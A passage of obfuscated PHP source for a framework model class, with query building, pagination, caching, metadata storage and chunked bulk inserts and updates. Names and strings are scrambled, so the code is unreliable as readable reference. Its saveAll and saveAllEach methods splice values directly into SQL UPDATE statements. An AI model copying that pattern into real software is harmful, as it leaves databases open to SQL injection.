$Ú±ÁË¡Ÿ ? $Ú±ÁË¡Ÿ : $²öªëïú[223]; } elseif ($‚ñêÎß†) { if (is_string($á­‹œÙ‹)) { $á­‹œÙ‹ = explode($²öªëïú[50], $á­‹œÙ‹); } $Ú±ÁË¡Ÿ = $this->getDbFields(); $á­‹œÙ‹ = $Ú±ÁË¡Ÿ ? array_diff($Ú±ÁË¡Ÿ, $á­‹œÙ‹) : $á­‹œÙ‹; } $this->options[$²öªëïú[353]] = $á­‹œÙ‹; return $this; } public function scope($‚í˜÷×œ = '', $ğëî¦—† = NULL) { $‡§óéİ =& $_SERVER[¯‘·½]; if ($‡§óéİ[12] === $‚í˜÷×œ) { if (isset($this->_scope[$‡§óéİ[37]])) { $Òíï¿Å = $this->_scope[$‡§óéİ[37]]; } else { return $this; } } elseif (is_string($‚í˜÷×œ)) { $ßÉ¿‹—Ş = explode($‡§óéİ[50], $‚í˜÷×œ); $Òíï¿Å = array(); foreach ($ßÉ¿‹—Ş as $–şìöØ”) { if (!isset($this->_scope[$–şìöØ”])) { continue; } $Òíï¿Å = array_merge($Òíï¿Å, $this->_scope[$–şìöØ”]); } if (!empty($ğëî¦—†) && is_array($ğëî¦—†)) { $Òíï¿Å = array_merge($Òíï¿Å, $ğëî¦—†); } } elseif (is_array($‚í˜÷×œ)) { $Òíï¿Å = $‚í˜÷×œ; } if (is_array($Òíï¿Å) && !empty($Òíï¿Å)) { $this->options = array_merge($this->options, array_change_key_case($Òíï¿Å)); } return $this; } public function where($¢œ²ĞÒ‰, $ä®²ÄãÖ = null) { $®ÃÍÃç² =& $_SERVER[¯‘·½]; if (!is_null($ä®²ÄãÖ) && is_string($¢œ²ĞÒ‰)) { if (!is_array($ä®²ÄãÖ)) { $ä®²ÄãÖ = func_get_args(); array_shift($ä®²ÄãÖ); } $ä®²ÄãÖ = array_map(array($this->db, $®ÃÍÃç²[420]), $ä®²ÄãÖ); $¢œ²ĞÒ‰ = vsprintf($¢œ²ĞÒ‰, $ä®²ÄãÖ); } elseif (is_object($¢œ²ĞÒ‰)) { $¢œ²ĞÒ‰ = get_object_vars($¢œ²ĞÒ‰); } elseif (is_array($¢œ²ĞÒ‰)) { foreach ($¢œ²ĞÒ‰ as $Õ‘ ÷Ğˆ => $ëóõ®å¥) { if ((is_numeric($Õ‘ ÷Ğˆ) || !$Õ‘ ÷Ğˆ) && is_string($ëóõ®å¥)) { if (strpos($ëóõ®å¥, $®ÃÍÃç²[427]) === 0) { continue; } think_trace($®ÃÍÃç²[428], $®ÃÍÃç²[12], $®ÃÍÃç²[49]); die; } } } if (is_string($¢œ²ĞÒ‰) && $®ÃÍÃç²[12] != $¢œ²ĞÒ‰) { $ªĞ–˜ä = array(); $ªĞ–˜ä[$®ÃÍÃç²[429]] = $¢œ²ĞÒ‰; $¢œ²ĞÒ‰ = $ªĞ–˜ä; } if (isset($this->options[$®ÃÍÃç²[355]])) { $this->options[$®ÃÍÃç²[355]] = array_merge($this->options[$®ÃÍÃç²[355]], $¢œ²ĞÒ‰); } else { $this->options[$®ÃÍÃç²[355]] = $¢œ²ĞÒ‰; } return $this; } public function limit($¹ŸÂ´«æ, $·©Ò†ÊÌ = null) { $´Æºöæ› =& $_SERVER[¯‘·½]; $this->options[$´Æºöæ›[370]] = is_null($·©Ò†ÊÌ) ? $¹ŸÂ´«æ : $¹ŸÂ´«æ . $´Æºöæ›[50] . $·©Ò†ÊÌ; return $this; } public function page($†Ó±ÌÂ, $Ôá‹Ú¼Ú = null) { $ıÕİ»• =& $_SERVER[¯‘·½]; $this->options[$ıÕİ»•[430]] = is_null($Ôá‹Ú¼Ú) ? $†Ó±ÌÂ : $†Ó±ÌÂ . $ıÕİ»•[50] . $Ôá‹Ú¼Ú; return $this; } public function comment($†·øÖç÷) { $this->options[$_SERVER[¯‘·½][431]] = $†·øÖç÷; return $this; } public function setProperty($À…›Ü¸›, $å¬¶®ƒÛ) { if (property_exists($this, $À…›Ü¸›)) { $this->{$À…›Ü¸›} = $å¬¶®ƒÛ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\x6d\145", "\164\151\155\145", "\x69\x6e\163\145\x72\164\x2c\165\160\144\x61\164\145", "\146\165\x6e\x63\164\151\157\x6e"), array("\143\162\145\x61\x74\145\124\151\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\145\162\x74", "\146\165\156\143\x74\x69\157\156")); public function setDataAuto($Ã¨­Çè‘) { $this->dataAuto = $Ã¨­Çè‘; } public function __construct($©­”³øÉ = '', $¢ãĞŠïŞ = '', $Ê½³…Šõ = '') { parent::__construct($©­”³øÉ, $¢ãĞŠïŞ, $Ê½³…Šõ); } protected $tableMeta = array(); protected function _beforeInsert(&$òÃ¡ü°Ë, $ŸŞ¾èâƒ) { $€ãÎÛÜÒ =& $_SERVER[¯‘·½]; if (!$this->checkDataAutoHas($€ãÎÛÜÒ[432])) { return; } $this->dataBeforeFilter($òÃ¡ü°Ë, $€ãÎÛÜÒ[432]); } protected function _beforeUpdate(&$ú²ÔäĞ‘, $ÁßÔ©ÜÜ) { $†¡İâ¥¿ =& $_SERVER[¯‘·½]; if (!$this->checkDataAutoHas($†¡İâ¥¿[433])) { return; } $this->dataBeforeFilter($ú²ÔäĞ‘, $†¡İâ¥¿[433]); } protected function _afterSelect(&$»‚àŠ¥Æ, $îšûçë¹) { if (!is_array($»‚àŠ¥Æ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯‘·½][434])) { return; } foreach ($»‚àŠ¥Æ as &$ı‘›ùÙ€) { $this->dataAfterFilter($ı‘›ùÙ€); } unset($ı‘›ùÙ€); } protected function _afterFind(&$ÎÊÈ©œ , $˜´¾¤ø±) { if (!is_array($ÎÊÈ©œ )) { return; } if (!$this->checkDataAutoHas($_SERVER[¯‘·½][434])) { return; } $this->dataAfterFilter($ÎÊÈ©œ ); } public static function textEncode($±„€Ä‹ƒ) { if (!$±„€Ä‹ƒ) { return $±„€Ä‹ƒ; } $úÏ‹Ò× = json_encode($±„€Ä‹ƒ); $úÏ‹Ò× = preg_replace_callback($_SERVER[¯‘·½][435], function ($Ã¯êôÅ½) { return addslashes($Ã¯êôÅ½[0]); }, $úÏ‹Ò×); return json_decode($úÏ‹Ò×); } public static function textDecode($§úÅ¢º) { $ƒšë’›´ =& $_SERVER[¯‘·½]; $è±¤‘• = json_encode($§úÅ¢º); $è±¤‘• = preg_replace_callback($ƒšë’›´[436], function ($Û©Ì±­) { return $_SERVER[¯‘·½][100]; }, $è±¤‘•); return json_decode($è±¤‘•); } public function setAutoIncrement($´¦ô“©“) { $ò˜¤Ó‹ = array($this->getPk() => $´¦ô“©“); $Á¸ÚµŒŞ = $this->data($ò˜¤Ó‹)->add(); if ($Á¸ÚµŒŞ) { $this->delete($Á¸ÚµŒŞ); } } public function getAutoIncrement() { $îÓæ½ãò = $this->getTableName(); $šÀØ£Ñº = $this->max($this->getPk()); $Óı³»Œ = $this->query("\x73\150\157\x77\40\164\x61\x62\x6c\145\x20\163\x74\x61\164\x75\163\40\x77\x68\x65\x72\x65\x20\116\141\155\145\75\47{$îÓæ½ãò}\47"); $å„ÇèØÁ = $Óı³»Œ[0][$_SERVER[¯‘·½][437]]; $˜çÙ²Øõ = max($šÀØ£Ñº, $å„ÇèØÁ); return $˜çÙ²Øõ; } protected function _callBefore($³Ş¬çÅ¶, $˜šÑØø™) { return $this->cacheCallCheck($³Ş¬çÅ¶, $˜šÑØø™, !1); } protected function _callAfter($õ“„¿µì, $«À›ÑÛ¸) { return $this->cacheCallCheck($õ“„¿µì, $«À›ÑÛ¸, !0); } protected function cacheFunctionAlias($Ú¶ÌôæŞ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($îêªŒ…, $ô²Âï“, $Ìù…Ú·Ì = false) { $¤š“æóİ =& $_SERVER[¯‘·½]; $ò¤§ã¾Ğ = $this->cacheFunctionAlias($ô²Âï“); if (!$ò¤§ã¾Ğ) { return; } foreach ($ò¤§ã¾Ğ as $§Ø·«ÅÓ => $ÊØ½Ş«) { $âÌõáÆ = $ÊØ½Ş«[0]; $¸®ıÕºµ = explode($¤š“æóİ[50], $ÊØ½Ş«[1]); $÷üùÌº = isset($ÊØ½Ş«[2]) ? $ÊØ½Ş«[2] : $¤š“æóİ[12]; if ($îêªŒ… == $§Ø·«ÅÓ) { return $this->cacheFunctionGet($§Ø·«ÅÓ, $âÌõáÆ, $÷üùÌº); } if ($Ìù…Ú·Ì && in_array($îêªŒ…, $¸®ıÕºµ)) { $this->cacheFunctionClear($§Ø·«ÅÓ, $âÌõáÆ, $÷üùÌº); } } } public function cacheFunctionGet($–”›˜ú€, $€Ÿ°ˆé¹, $Àè‡“óŸ = '') { $Ö¸¢°‹ş = $this->cacheKeyMake($–”›˜ú€, $€Ÿ°ˆé¹, $Àè‡“óŸ); $óİ­Í£œ = Cache::get($Ö¸¢°‹ş); if (!is_array($óİ­Í£œ)) { $óİ­Í£œ = call_user_func_array(array($this, $–”›˜ú€), array($€Ÿ°ˆé¹, !0)); Cache::set($Ö¸¢°‹ş, $óİ­Í£œ); } return $óİ­Í£œ; } public function cacheFunctionClear($Çƒ‹Ì, $ºóØØÒÊ, $Ã‹äº÷ = '') { $şòÕ”®ï = $ºóØØÒÊ; if (!is_array($ºóØØÒÊ)) { $şòÕ”®ï = array($ºóØØÒÊ); } foreach ($şòÕ”®ï as $€İÔæóë) { $Œ–˜Î = $this->cacheKeyMake($Çƒ‹Ì, $€İÔæóë, $Ã‹äº÷); Cache::remove($Œ–˜Î); } } public function cacheKeyMake($¹óº‘À®, $Î¹¼¯äé, $ Ê¼¶é§) { $š‹»š…å =& $_SERVER[¯‘·½]; if ($ Ê¼¶é§) { $Î¹¼¯äé = $Î¹¼¯äé . $š‹»š…å[438] . $ Ê¼¶é§; } return get_class($this) . $š‹»š…å[11] . $¹óº‘À® . $š‹»š…å[439] . $Î¹¼¯äé; } protected function selectPageReset() { $†ùæıÎ =& $_SERVER[¯‘·½]; if (isset($GLOBALS[$†ùæıÎ[440]])) { return; } $GLOBALS[$†ùæıÎ[440]] = isset($GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[441]]) ? $GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[441]] : !1; $GLOBALS[$†ùæıÎ[442]] = isset($GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[430]]) ? $GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[430]] : !1; $GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[441]] = !1; $GLOBALS[$†ùæıÎ[7]][$†ùæıÎ[430]] = !1; } protected function selectPageRestore() { $£ÆÂÃ =& $_SERVER[¯‘·½]; if (!isset($GLOBALS[$£ÆÂÃ[440]])) { return; } $GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[441]] = $GLOBALS[$£ÆÂÃ[440]]; $GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[430]] = $GLOBALS[$£ÆÂÃ[442]]; if ($GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[441]] === !1) { unset($GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[441]]); } if ($GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[430]] === !1) { unset($GLOBALS[$£ÆÂÃ[7]][$£ÆÂÃ[430]]); } unset($GLOBALS[$£ÆÂÃ[440]]); unset($GLOBALS[$£ÆÂÃ[442]]); } protected function selectPage($ßº‹á€ = 200, $Ğ…˜Ûõ  = 1) { $°¹½ùÊ =& $_SERVER[¯‘·½]; global $in; $ñŞ¹¹íÊ = $this->optionsValue(); $Å‘Êœ‡Ñ = 50000; $ßº‹á€ = isset($in[$°¹½ùÊ[441]]) && $in[$°¹½ùÊ[441]] ? $in[$°¹½ùÊ[441]] : $ßº‹á€; if ($ßº‹á€ === -1) { $in[$°¹½ùÊ[441]] = !1; $Å‘Êœ‡Ñ = 100000000; $ßº‹á€ = $Å‘Êœ‡Ñ; } $‹››ëú = $ñŞ¹¹íÊ; $‹››ëú[$°¹½ùÊ[443]] = array(); $ßº‹á€ = intval($ßº‹á€); $ßº‹á€ = $ßº‹á€ <= 5 ? 5 : ($ßº‹á€ >= $Å‘Êœ‡Ñ ? $Å‘Êœ‡Ñ : $ßº‹á€); $Ğ…˜Ûõ  = intval(isset($in[$°¹½ùÊ[430]]) && $in[$°¹½ùÊ[430]] ? $in[$°¹½ùÊ[430]] : $Ğ…˜Ûõ ); $Ğ…˜Ûõ  = $Ğ…˜Ûõ  <= 1 ? 1 : $Ğ…˜Ûõ ; $Û—÷£ ˆ = array(); $ì•èıš© = 1; if ($Ğ…˜Ûõ  == 1 && $ì•èıš©) { $this->optionsValue($ñŞ¹¹íÊ); $Û—÷£ ˆ = $this->page($Ğ…˜Ûõ , $ßº‹á€)->select(); $õÙÍÚäï = is_array($Û—÷£ ˆ) ? count($Û—÷£ ˆ) : 0; if ($õÙÍÚäï < $ßº‹á€) { $ç×Ÿ†Ó = 1; } else { $this->optionsValue($‹››ëú); $õÙÍÚäï = intval($this->count()); $ç×Ÿ†Ó = ceil($õÙÍÚäï / $ßº‹á€); } } else { $this->optionsValue($‹››ëú); $õÙÍÚäï = intval($this->count()); $ç×Ÿ†Ó = ceil($õÙÍÚäï / $ßº‹á€); $Ğ…˜Ûõ  = $Ğ…˜Ûõ  >= $ç×Ÿ†Ó ? $ç×Ÿ†Ó : $Ğ…˜Ûõ ; $this->optionsValue($ñŞ¹¹íÊ); $Û—÷£ ˆ = $this->page($Ğ…˜Ûõ , $ßº‹á€)->select(); } if (!is_array($Û—÷£ ˆ)) { $Û—÷£ ˆ = array(); } if ($ç×Ÿ†Ó == 1) { $õÙÍÚäï = count($Û—÷£ ˆ); } $Æ¸•¿Ö‰ = array($°¹½ùÊ[444] => array($°¹½ùÊ[445] => $õÙÍÚäï, $°¹½ùÊ[441] => $ßº‹á€, $°¹½ùÊ[430] => $Ğ…˜Ûõ , $°¹½ùÊ[446] => $ç×Ÿ†Ó), $°¹½ùÊ[447] => $Û—÷£ ˆ); return $Æ¸•¿Ö‰; } protected function checkLength($‘äÙòÁÒ, $…ìçÖ½É = 0, $­¹ÕùÊØ = '') { $’Ñí«ù‹ =& $_SERVER[¯‘·½]; $…ìçÖ½É = $…ìçÖ½É ? $…ìçÖ½É : 65536; if (!$‘äÙòÁÒ || strlen($‘äÙòÁÒ) < $…ìçÖ½É) { return; } $­¹ÕùÊØ = $­¹ÕùÊØ ? $­¹ÕùÊØ . $’Ñí«ù‹[74] : $’Ñí«ù‹[12]; show_json($­¹ÕùÊØ . LNG($’Ñí«ù‹[448]) . "\50{$…ìçÖ½É}\x29", !1); } protected function metaSet($êÁÇÀÓ, $õûˆíÉâ = null, $Æ±Ö¿¿ = null) { $ıü€éæ =& $_SERVER[¯‘·½]; if (!$this->tableMeta || !$êÁÇÀÓ) { return !1; } $Æáá‘Èâ = $this->tableMeta[$ıü€éæ[449]]; $øùš‹óı = $this->tableMeta[$ıü€éæ[450]]; $¡è´°¡– = Model($øùš‹óı); $¼ÖÉ¡ÁÃ = array($Æáá‘Èâ => $êÁÇÀÓ, $ıü€éæ[451] => $õûˆíÉâ); if (is_null($õûˆíÉâ)) { return $¡è´°¡–->where(array($Æáá‘Èâ => $êÁÇÀÓ))->delete(); } if (is_null($Æ±Ö¿¿) && is_string($õûˆíÉâ)) { return $¡è´°¡–->where($¼ÖÉ¡ÁÃ)->delete(); } $ãš¾ç»ğ = is_array($õûˆíÉâ) ? $õûˆíÉâ : array(); if (is_string($õûˆíÉâ)) { $ãš¾ç»ğ[$õûˆíÉâ] = $Æ±Ö¿¿; } $“õ‡Æû = array(); foreach ($ãš¾ç»ğ as $ë‹÷’¯– => $ÜœÑà™Ì) { if (is_null($ÜœÑà™Ì) && is_string($ë‹÷’¯–)) { $¡è´°¡–->where(array($Æáá‘Èâ => $êÁÇÀÓ, $ıü€éæ[451] => $ë‹÷’¯–))->delete(); continue; } $this->checkLength($ÜœÑà™Ì, !1, $øùš‹óı . $ıü€éæ[4] . $ë‹÷’¯–); $“õ‡Æû[] = array($Æáá‘Èâ => $êÁÇÀÓ, $ıü€éæ[97] => $ë‹÷’¯–, $ıü€éæ[452] => $ÜœÑà™Ì); } $Ä£âØõú = $ıü€éæ[453] . $øùš‹óı; CacheLock::lock($Ä£âØõú); $¡è´°¡–->where(array($Æáá‘Èâ => $êÁÇÀÓ))->addAll($“õ‡Æû, array(), !0); CacheLock::unlock($Ä£âØõú); return !0; } public function metaGet($ö´·×–¬, $ìÖŒÀè‘ = false) { $ß§¯Ìç‹ =& $_SERVER[¯‘·½]; if (!$this->tableMeta) { return array(); } $‰ÌËµ‡ı = $this->tableMeta[$ß§¯Ìç‹[449]]; $Ô”ºµ¿ = Model($this->tableMeta[$ß§¯Ìç‹[450]]); if ($ìÖŒÀè‘) { $ßí„ıô† = array($‰ÌËµ‡ı => $ö´·×–¬, $ß§¯Ìç‹[97] => $ìÖŒÀè‘); return $Ô”ºµ¿->where($ßí„ıô†)->getField($ß§¯Ìç‹[452]); } $ßí„ıô† = array($‰ÌËµ‡ı => $ö´·×–¬); $ÍËâ¸¶Ñ = $Ô”ºµ¿->field($ß§¯Ìç‹[454])->where($ßí„ıô†)->select(); $ÍËâ¸¶Ñ = array_to_keyvalue($ÍËâ¸¶Ñ, $ß§¯Ìç‹[97], $ß§¯Ìç‹[452]); return $ÍËâ¸¶Ñ; } private function checkDataAutoHas($Ç„Å¶Ãœ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $šæ¾×°Ã) { if (in_array($Ç„Å¶Ãœ, explode($_SERVER[¯‘·½][50], $šæ¾×°Ã[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¾½êÄÛ, $Ûµ˜‚¢–) { $«Ñ¸‹¤ =& $_SERVER[¯‘·½]; if (!is_array($¾½êÄÛ)) { return; } foreach ($this->dataAuto as $Ä°¼ãÛò) { $Èƒ¶õ = $Ä°¼ãÛò[0]; if (!in_array($Ûµ˜‚¢–, explode($«Ñ¸‹¤[50], $Ä°¼ãÛò[2]))) { continue; } switch (trim($Ä°¼ãÛò[3])) { case $«Ñ¸‹¤[398]: case $«Ñ¸‹¤[399]: $ôİ™÷Ãı = $Ä°¼ãÛò[1]; $´Ë¿»Èö = isset($Ä°¼ãÛò[4]) ? (array) $Ä°¼ãÛò[4] : array(); if ($ôİ™÷Ãı == $«Ñ¸‹¤[207] && array_key_exists($Èƒ¶õ, $¾½êÄÛ)) { if (!$¾½êÄÛ[$Èƒ¶õ]) { unset($¾½êÄÛ[$Èƒ¶õ]); } break; } if (isset($¾½êÄÛ[$Èƒ¶õ])) { array_unshift($´Ë¿»Èö, $¾½êÄÛ[$Èƒ¶õ]); } if ($«Ñ¸‹¤[398] == $Ä°¼ãÛò[3]) { $¾½êÄÛ[$Èƒ¶õ] = call_user_func_array($ôİ™÷Ãı, $´Ë¿»Èö); } else { $¾½êÄÛ[$Èƒ¶õ] = call_user_func_array(array(&$this, $ôİ™÷Ãı), $´Ë¿»Èö); } break; case $«Ñ¸‹¤[350]: if (isset($¾½êÄÛ[$Èƒ¶õ]) && $¾½êÄÛ[$Èƒ¶õ]) { $¾½êÄÛ[$Èƒ¶õ] = call_user_func_array(array(&$this, $Ä°¼ãÛò[1]), array($¾½êÄÛ[$Èƒ¶õ])); } break; case $«Ñ¸‹¤[353]: $¾½êÄÛ[$Èƒ¶õ] = $¾½êÄÛ[$Ä°¼ãÛò[1]]; break; case $«Ñ¸‹¤[371]: if (isset($¾½êÄÛ[$Èƒ¶õ]) && !is_string($¾½êÄÛ[$Èƒ¶õ])) { $¾½êÄÛ[$Èƒ¶õ] = json_encode_force($¾½êÄÛ[$Èƒ¶õ]); } break; case $«Ñ¸‹¤[400]: if ($¾½êÄÛ[$Èƒ¶õ] === $«Ñ¸‹¤[12]) { unset($¾½êÄÛ[$Èƒ¶õ]); } break; case $«Ñ¸‹¤[401]: $¾½êÄÛ[$Èƒ¶õ] = $Ä°¼ãÛò[1]; default: break; } } if ($Ûµ˜‚¢– == $«Ñ¸‹¤[432]) { $º¢ŸË½ß = strtolower($this->db->getDbType()); if (strpos($º¢ŸË½ß, $«Ñ¸‹¤[13]) !== 0) { return; } $õ…²©Ü¢ = $this->field(!0)->fields; $ºÄ¥ƒÍ = $õ…²©Ü¢[$«Ñ¸‹¤[332]]; if (isset($õ…²©Ü¢[$«Ñ¸‹¤[331]])) { unset($ºÄ¥ƒÍ[$õ…²©Ü¢[$«Ñ¸‹¤[331]]]); } foreach ($ºÄ¥ƒÍ as $ˆ†ışã => $Ûµ˜‚¢–) { if (!isset($¾½êÄÛ[$ˆ†ışã])) { $¾½êÄÛ[$ˆ†ışã] = $«Ñ¸‹¤[12]; } } } } private function dataAfterFilter(&$ÈÊ¶íºê) { $ô¶Ë¸Ï =& $_SERVER[¯‘·½]; foreach ($this->dataAuto as $«ßªõ­õ) { $­àò¦¡‘ = $«ßªõ­õ[0]; if (!isset($ÈÊ¶íºê[$­àò¦¡‘])) { continue; } if (!in_array($ô¶Ë¸Ï[434], explode($ô¶Ë¸Ï[50], $«ßªõ­õ[2]))) { continue; } switch (trim($«ßªõ­õ[3])) { case $ô¶Ë¸Ï[398]: case $ô¶Ë¸Ï[399]: $ŸÃ‹­‹” = isset($«ßªõ­õ[4]) ? (array) $«ßªõ­õ[4] : array(); array_unshift($ŸÃ‹­‹”, $ÈÊ¶íºê[$­àò¦¡‘]); if (isset($«ßªõ­õ[4]) && $«ßªõ­õ[4] == $ô¶Ë¸Ï[455]) { $ŸÃ‹­‹” = array($ÈÊ¶íºê[$­àò¦¡‘]); } if ($ô¶Ë¸Ï[398] == $«ßªõ­õ[3]) { $ÈÊ¶íºê[$­àò¦¡‘] = call_user_func_array($«ßªõ­õ[1], $ŸÃ‹­‹”); } else { $ÈÊ¶íºê[$­àò¦¡‘] = call_user_func_array(array(&$this, $«ßªõ­õ[1]), $ŸÃ‹­‹”); } break; case $ô¶Ë¸Ï[350]: if (isset($ÈÊ¶íºê[$­àò¦¡‘]) && $ÈÊ¶íºê[$­àò¦¡‘]) { $ÈÊ¶íºê[$­àò¦¡‘] = call_user_func_array(array(&$this, $«ßªõ­õ[1]), array($ÈÊ¶íºê[$­àò¦¡‘])); } break; case $ô¶Ë¸Ï[353]: $ÈÊ¶íºê[$­àò¦¡‘] = $ÈÊ¶íºê[$«ßªõ­õ[1]]; break; case $ô¶Ë¸Ï[371]: $¤É—ŞÒ = $ÈÊ¶íºê[$­àò¦¡‘]; $ÈÊ¶íºê[$­àò¦¡‘] = json_decode($¤É—ŞÒ, !0); if (is_null($ÈÊ¶íºê[$­àò¦¡‘])) { $ÈÊ¶íºê[$­àò¦¡‘] = $¤É—ŞÒ; } break; case $ô¶Ë¸Ï[400]: if ($ÈÊ¶íºê[$­àò¦¡‘] === $ô¶Ë¸Ï[12]) { unset($ÈÊ¶íºê[$­àò¦¡‘]); } break; case $ô¶Ë¸Ï[401]: $ÈÊ¶íºê[$­àò¦¡‘] = $«ßªõ­õ[1]; break; default: break; } } } public function saveAll($åÇ÷’½Š) { $ÆğæÛ‡œ =& $_SERVER[¯‘·½]; $öñÑÂ€ = $this->tablePrefix . $this->tableName; $›¸›Î¶ = self::SQL_WHERE_IN_CHUNK; $åÇ÷’½Š = is_array($åÇ÷’½Š) ? $åÇ÷’½Š : array(); $’›î»¿ = $ÆğæÛ‡œ[456]; $–ˆÂÚ¿ê = 0; $Ğıõşñ = array(); $„ÎÊÃ¨­ = count($åÇ÷’½Š); for ($·¬¯ÌØ¨ = 0; $·¬¯ÌØ¨ < $„ÎÊÃ¨­; $·¬¯ÌØ¨++) { $‘æ»ÈùÜ = $åÇ÷’½Š[$·¬¯ÌØ¨]; if (!is_array($‘æ»ÈùÜ) || count($‘æ»ÈùÜ) != 4) { continue; } $“´îüÊ = "\125\120\104\x41\x54\105\x20\140{$öñÑÂ€}\x60\x20\123\105\124\40{$‘æ»ÈùÜ[2]}\40\75\40\x43\x41\x53\105\x20{$‘æ»ÈùÜ[0]}\x20\12"; if ($–ˆÂÚ¿ê == 0) { $’›î»¿ = $“´îüÊ; } $Ğıõşñ[] = $ÆğæÛ‡œ[121] . $‘æ»ÈùÜ[1] . $ÆğæÛ‡œ[121]; $–ˆÂÚ¿ê++; $’›î»¿ .= "\40\127\x48\x45\116\x20\x27{$‘æ»ÈùÜ[1]}\47\40\124\x48\x45\116\x20\47{$‘æ»ÈùÜ[3]}\47\x20\xa"; if ($–ˆÂÚ¿ê == $›¸›Î¶ || $·¬¯ÌØ¨ == $„ÎÊÃ¨­ - 1) { $Ü¿şğê = implode($ÆğæÛ‡œ[50], $Ğıõşñ); $’›î»¿ .= "\x20\105\x4e\x44\x20\x20\x57\x48\105\122\105\40{$‘æ»ÈùÜ[0]}\40\111\116\x20\x28{$Ü¿şğê}\51\40"; $this->execute($’›î»¿); $–ˆÂÚ¿ê = 0; $’›î»¿ = $“´îüÊ; $this->chunkEventCheck(count($Ğıõşñ)); $Ğıõşñ = array(); } } $this->chunkEventSet(); } public function saveAllEach($çªâ½Ë³) { $¾¹É÷ÚÍ =& $_SERVER[¯‘·½]; $¼Óµí = $this->tablePrefix . $this->tableName; foreach ($çªâ½Ë³ as $“şÑÓ¼) { if (!is_array($“şÑÓ¼) || count($“şÑÓ¼) != 4) { continue; } $Ú›öÅÒß = $“şÑÓ¼[0] . $¾¹É÷ÚÍ[457] . $“şÑÓ¼[1] . $¾¹É÷ÚÍ[121]; $ïÍ£º× = $“şÑÓ¼[2] . $¾¹É÷ÚÍ[457] . $“şÑÓ¼[3] . $¾¹É÷ÚÍ[121]; $Ñ‰ä·€€ = "\x75\x70\144\x61\164\145\40{$¼Óµí}\x20\x73\x65\164\x20{$ïÍ£º×}\x20\x77\x68\x65\162\145\40{$Ú›öÅÒß}\73"; $this->execute($Ñ‰ä·€€); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($„Ô¼èª‘ = false, $ÃÔÚà‘µ = false) { $this->_chunkEvent = $„Ô¼èª‘; $this->_chunkEventParam = $ÃÔÚà‘µ; } private function chunkEventCheck($şì¥º¶) { if (!$this->_chunkEvent) { return; } $Æğª¥ı¤ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Æğª¥ı¤[$_SERVER[¯‘·½][458]] = $şì¥º¶; Hook::trigger($this->_chunkEvent, $Æğª¥ı¤); } public function addAll($Àª­¢ˆÎ, $ˆÓ®˜Û· = array(), $Î‘êãèÚ = false) { $İ‚ˆŒİ¿ =& $_SERVER[¯‘·½]; ignore_timeout(); $‘äë‘Ö = self::SQL_WHERE_IN_CHUNK; if (empty($Àª­¢ˆÎ)) { $this->error = think_lang($İ‚ˆŒİ¿[351]); return !1; } $ˆÓ®˜Û· = $this->_parseOptions($ˆÓ®˜Û·); foreach ($Àª­¢ˆÎ as $˜ÇçÄå• => $ãÈÉä‹‡) { $Àª­¢ˆÎ[$˜ÇçÄå•] = $this->_facade($ãÈÉä‹‡); $this->_beforeInsert($Àª­¢ˆÎ[$˜ÇçÄå•], $ˆÓ®˜Û·); } if (method_exists($this->db, $İ‚ˆŒİ¿[352])) { for ($¿ŸÂßÏÆ = 0; $¿ŸÂßÏÆ < count($Àª­¢ˆÎ); $¿ŸÂßÏÆ += $‘äë‘Ö) { $±»î’åì = array_slice($Àª­¢ˆÎ, $¿ŸÂßÏÆ, $‘äë‘Ö); if (!is_array($±»î’åì) || count($±»î’åì) == 0) { break; } $«ĞÄ»Ê½ = $this->db->insertAll($±»î’åì, $ˆÓ®˜Û·, $Î‘êãèÚ); $this->chunkEventCheck(count($±»î’åì)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Àª­¢ˆÎ as $˜ÇçÄå• => $ãÈÉä‹‡) { $«ĞÄ»Ê½ = $this->db->insert($ãÈÉä‹‡, $ˆÓ®˜Û·, $Î‘êãèÚ); } $this->commit(); } if (!1 !== $«ĞÄ»Ê½) { $ÈÆ¿°›ü = $this->getLastInsID(); if ($ÈÆ¿°›ü) { return $ÈÆ¿°›ü; } } return $«ĞÄ»Ê½; } public function save($Å§ÃÑâê = '', $§¡Ûû = array()) { $£È¯ì¡ö =& $_SERVER[¯‘·½]; $‰Êê‡˜Ï = self::SQL_WHERE_IN_CHUNK; $š—‰ú´É = $this->optionsValue(); $¼ôÇ­ü• = $this->findWhereField($š—‰ú´É); if (!$¼ôÇ­ü•) { return parent::save($Å§ÃÑâê, $§¡Ûû); } $ó·Öû©± = 0; $£‡æ½²ç = $š—‰ú´É[$£È¯ì¡ö[355]][$¼ôÇ­ü•][1]; $£‡æ½²ç = is_array($£‡æ½²ç) ? $£‡æ½²ç : array(); $•¥ğù¸Ç = count($£‡æ½²ç); for ($­·óı”ƒ = 0; $­·óı”ƒ < $•¥ğù¸Ç; $­·óı”ƒ += $‰Êê‡˜Ï) { $´şêò×† = array_slice($£‡æ½²ç, $­·óı”ƒ, $‰Êê‡˜Ï); if (!is_array($´şêò×†) || count($´şêò×†) == 0) { break; } $š—‰ú´É[$£È¯ì¡ö[355]][$¼ôÇ­ü•][1] = $´şêò×†; $this->optionsValue($š—‰ú´É); $ó·Öû©± += parent::save($Å§ÃÑâê, $§¡Ûû); $this->chunkEventCheck(count($´şêò×†)); } $this->chunkEventSet(); return $ó·Öû©±; } public function add($Âî…ƒØÂ = '', $ŒÆ™ µ® = array(), $˜½åÙ¸ = false) { if ($this->addTaskStatus && is_array($Âî…ƒØÂ)) { $this->addTaskData[] = $Âî…ƒØÂ; return; 